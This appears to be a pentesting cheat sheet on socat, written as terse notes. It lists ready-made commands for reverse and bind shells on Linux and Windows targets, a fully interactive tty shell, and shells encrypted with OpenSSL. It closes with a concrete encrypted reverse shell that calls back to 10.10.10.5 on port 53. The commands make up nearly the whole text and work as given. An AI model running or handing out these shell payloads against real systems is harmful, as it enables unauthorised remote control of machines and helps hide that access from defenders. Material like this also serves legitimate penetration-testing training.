# Socat

## Reverse Shells

Syntax for basic reverse shell listener:

`socat TCP-L:<PORT> -`

- takes two points (listening port and standard input) and connects them
- equivalent to `nc -nvlp <PORT>`

- On Windows, use this command to connect back:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

- "pipes" option is used to force powershell to use Unix style STDIN and STDOUT

- Linux target:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

## Bind Shells

- On Linux target:

`socat TCP-L:<PORT> EXEC:"bash -li"`

- On Windows target:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

- Command on attacking machine to connect:

`socat TCP:<TARGET_IP> -`

## `tty` reverse shell

Fully stable

Only works on Linux target

- Listener syntax:

`socat TCP-L:<PORT> FILE:``tty``,raw,echo=0`

- Listener can be connected w/ any payload
- Must be activated w/ a very specific socat command
	- target must have socat installed
	- upload a precompiled socat binary

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

>[!NOTE]
>If not working well, add -d -d into the command for more verbosity

# Socat Encrypted Shells

Anytime `TCP` is used, replace with `OPENSSL`

- Generate a certificate on attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

- Creates a 2048 bit RSA key w/ matching cert file, self-signed, and valid for under a year
- Info can be left blank
- Merge two create files into a `.pem` file:

`cat shell.key shell.crt > shell.pem`

- When setting up reverse shell, use:

`socat OPENSSL:<LOCAL_IP>:<LOCAL_PORT>,verify=0 EXEC:/bin/bash`

- For __bind shell__:

Target:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

Attacker:

`socat OPENSSL:<TARGET_IP>:<TARGET_PORT>,verify=0 -`

`socat OPENSSL-LISTEN:53 FILE:tty,raw,echo=0,cert=encrypt.pem,verify=0`

`socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

